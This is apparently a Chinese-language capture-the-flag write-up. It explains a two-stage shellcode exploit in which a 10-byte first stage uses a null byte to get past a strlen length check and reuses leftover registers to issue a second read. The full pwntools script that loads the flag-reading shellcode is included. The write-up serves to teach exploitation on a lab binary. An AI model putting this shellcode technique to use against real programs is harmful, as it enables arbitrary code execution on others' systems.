# 任意代码执行

## 题目简述

程序把 `bss` 所在的 0x3000 字节内存改为 RWX，读入最多 10 **字节**，通过 `strlen(bss) <= 3` 后直接跳到 `bss` 执行：

```c
mprotect((void *)((uintptr_t)bss & ~0xfff), 0x3000, 7);
read(0, bss, 10);
if (strlen(bss) > 3) {
    puts("Too many");
    exit(0);
}
void (*shellcode)() = bss;
shellcode();
```

10 字节不足以直接完成 ORW，但足以发起第二次 `read`。`strlen` 只要求前 4 字节内出现 `\x00`，并不限制零字节之后的机器码。

## 解题过程

在题目二进制中调试 shellcode 入口，可确认 `rax = 0`、`rsi = bss`，而 `r11` 是一个足够大的正值。于是第一阶段只需把 `rdi` 清零、把 `r11` 复制到 `rdx`，再执行 `syscall`，等价于：

```c
read(0, bss, r11);
```

恰好 10 字节的第一阶段为：

```asm
push 0
mov rdx, r11
xor rdi, rdi
syscall
```

`push 0` 编码为 `6a 00`，第二个字节就是 `strlen` 所需的字符串终止符，因此检测到的长度只有 1。

第二次 `read` 会从 `bss` 开头覆盖正在执行的第一阶段。系统调用返回时，`rip` 位于原 shellcode 的末尾，即 `bss+10`；因此第二阶段先放至少 16 字节 NOP，使 `bss+10` 仍落在滑道中，随后再执行读取 flag 的完整 shellcode。

```python
from pwn import *

context.arch = "amd64"

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 10000)
io = remote(HOST, PORT)

stage1 = asm("push 0; mov rdx, r11; xor rdi, rdi; syscall")
assert len(stage1) == 10
assert b"\x00" in stage1[:4]

stage2 = b"\x90" * 0x10
stage2 += asm(shellcraft.cat("./flag"))

# 第一次 read 最多只取 10 字节，剩余数据会留给 stage1 发起的第二次 read。
io.sendafter(b"Please input :)\n", stage1 + stage2)
io.interactive()
```

入口寄存器状态属于本题编译产物的利用条件；若换了编译器或优化级别，必须重新调试确认，不能把 `rax`、`rsi`、`r11` 的值当作通用 ABI 保证。

## 方法总结

本题是两阶段 shellcode：先利用早期零字节绕过 `strlen`，再借助入口残留寄存器在 10 字节内构造第二次 `read`，最后用 NOP 滑道解决自覆盖后的续执行位置。原题解中的“10 比特”应为“10 字节”，而 `push 0`、入口寄存器和 `bss+10` 的控制流都是不可省略的关键机制。
